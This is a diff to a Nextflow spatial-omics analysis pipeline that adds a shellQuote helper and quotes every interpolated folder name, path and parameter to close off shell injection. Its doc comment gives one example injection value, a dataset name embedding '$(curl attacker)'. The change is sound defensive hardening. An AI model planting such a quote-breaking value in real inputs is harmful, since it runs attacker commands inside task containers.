@@ -16,6 +16,18 @@ nextflow.enable.dsl = 2
 
 include { discoverCandidates } from './modules/discovery.nf'
 
+/** `value` as the body of a single-quoted shell word.
+ *
+ * Most of what the task scripts interpolate is data, not shell: a candidate's prefix
+ * and out_dir are discovered folder names (or keys of a --input mapping), and a staged
+ * input carries the folder's own name. A dataset called  a'$(curl attacker)'b  would
+ * otherwise close the quote and run in the task container. Closing and reopening the
+ * quote around each embedded quote leaves the value byte-identical to the command.
+ */
+def shellQuote(value) {
+    return value.toString().replace("'", "'\\''")
+}
+
 process ANALYSE {
     tag "${prefix} (${spec.label})"
     container params.analysis_container
@@ -41,27 +53,29 @@ process ANALYSE {
 
     script:
     def recipe_args = spec.recipes
-        .collect { recipe -> "--recipe ${backend}/app/recipes/${recipe}" }
+        .collect { recipe -> "--recipe '${shellQuote(backend)}/app/recipes/${shellQuote(recipe)}'" }
         .join(' \\\n        ')
     def reader_params_arg = spec.reader_params_json
-        ? "--reader-params '${spec.reader_params_json}'" : ''
+        ? "--reader-params '${shellQuote(spec.reader_params_json)}'" : ''
     // How the published checkpoint opens in the viewer. The display the app builds when
     // the object is first read predates every recipe, so it cannot colour by a column
     // the analysis is about to write.
     def color_by_arg = spec.display_color_by
-        ? "--display-color-by '${spec.display_color_by}'" : ''
+        ? "--display-color-by '${shellQuote(spec.display_color_by)}'" : ''
     def render_mode_arg = spec.display_render_mode
-        ? "--display-render-mode '${spec.display_render_mode}'" : ''
+        ? "--display-render-mode '${shellQuote(spec.display_render_mode)}'" : ''
     // Two statements rather than an `&&` chain: `set -e` does not abort on the left
     // operand of `&&`, so a chain would let a failed install fall through to a
     // confusing ImportError several minutes later instead of stopping here.
+    // `os_packages` is the one value deliberately left unquoted: it is a list of package
+    // names for apt-get and needs the shell's word splitting.
     def os_setup = params.os_packages
         ? "apt-get update\n    apt-get install -y --no-install-recommends ${params.os_packages}"
         : 'true'
     """
     ${os_setup}
 
-    mkdir -p '${spec.out_dir}'
+    mkdir -p '${shellQuote(spec.out_dir)}'
 
     # Keep the session's working set (unpacked stores, raster tiles) on the work
     # filesystem rather than the container's /tmp, and let admission control see the
@@ -74,7 +88,7 @@ process ANALYSE {
     # Isolated venv with pinned deps (squidpy requires Python 3.11; not 3.13+).
     # uv discovers ./.venv automatically for the subsequent pip install.
     uv venv --python 3.11
-    uv pip install -r ${backend}/requirements.txt
+    uv pip install -r '${shellQuote(backend)}/requirements.txt'
 
     # Reading is the part allowed to fail: a folder can look like a data type and still be
     # truncated, mis-exported or unreadable. Its log is published and the run carries on
@@ -84,39 +98,39 @@ process ANALYSE {
     # keeps it in the checkpoint's history as `failed` with its log and runs the rest, so
     # rc is 0 and the metrics below report the dataset as `partial`.
     set +e
-    .venv/bin/python ${backend}/cli.py \\
-        --parser ${spec.reader} \\
-        --input ${data_dir} \\
+    .venv/bin/python '${shellQuote(backend)}/cli.py' \\
+        --parser '${shellQuote(spec.reader)}' \\
+        --input '${shellQuote(data_dir)}' \\
         ${recipe_args} \\
-        --recipe-params '${spec.recipe_params_json}' \\
-        --lowres-max-image-mb ${params.lowres_max_image_mb} \\
-        --output '${spec.out_dir}' \\
+        --recipe-params '${shellQuote(spec.recipe_params_json)}' \\
+        --lowres-max-image-mb '${shellQuote(params.lowres_max_image_mb)}' \\
+        --output '${shellQuote(spec.out_dir)}' \\
         --name results \\
         --lowres-name lowres \\
-        --session-name '${prefix}' \\
+        --session-name '${shellQuote(prefix)}' \\
         ${reader_params_arg} \\
         ${color_by_arg} \\
-        ${render_mode_arg} 2>&1 | tee '${spec.out_dir}/results.log'
+        ${render_mode_arg} 2>&1 | tee '${shellQuote(spec.out_dir)}/results.log'
     rc=\${PIPESTATUS[0]}
     set -e
 
     # cli.py names each checkpoint `<base>-<content hash>.sdata.zarr.zip`, so the hash
     # asserts the bytes on the next load; only the base is ours to choose.
     if [ "\$rc" -eq 0 ]; then
-        .venv/bin/python ${metrics_script} \\
-            --sample '${prefix}' \\
-            --data-type '${spec.id}' \\
+        .venv/bin/python '${shellQuote(metrics_script)}' \\
+            --sample '${shellQuote(prefix)}' \\
+            --data-type '${shellQuote(spec.id)}' \\
             --status ok \\
-            --checkpoint ${spec.out_dir}/results-*.sdata.zarr.zip \\
-            --source-dir ${data_dir} \\
-            --run-metrics '${spec.run_metrics_json}' \\
-            --cluster-key '${params.cluster_key}' \\
-            --neighborhood-key '${params.neighborhood_key}'
+            --checkpoint '${shellQuote(spec.out_dir)}'/results-*.sdata.zarr.zip \\
+            --source-dir '${shellQuote(data_dir)}' \\
+            --run-metrics '${shellQuote(spec.run_metrics_json)}' \\
+            --cluster-key '${shellQuote(params.cluster_key)}' \\
+            --neighborhood-key '${shellQuote(params.neighborhood_key)}'
     else
-        echo "WARN: ${prefix} (${spec.id}) failed; see ${prefix}/results.log" >&2
-        .venv/bin/python ${metrics_script} \\
-            --sample '${prefix}' \\
-            --data-type '${spec.id}' \\
+        echo 'WARN: ${shellQuote(prefix)} (${shellQuote(spec.id)}) failed; see ${shellQuote(prefix)}/results.log' >&2
+        .venv/bin/python '${shellQuote(metrics_script)}' \\
+            --sample '${shellQuote(prefix)}' \\
+            --data-type '${shellQuote(spec.id)}' \\
             --status failed
     fi
     """
@@ -136,7 +150,7 @@ process MULTIQC {
     path 'multiqc_report_data'   // MultiQC names the data dir after --filename
 
     script:
-    def title = params.title.replace("'", "'\\''")   // survives the single-quoted shell word
+    def title = shellQuote(params.title)
     """
     multiqc --config ${multiqc_config} \\
         --title '${title}' \\
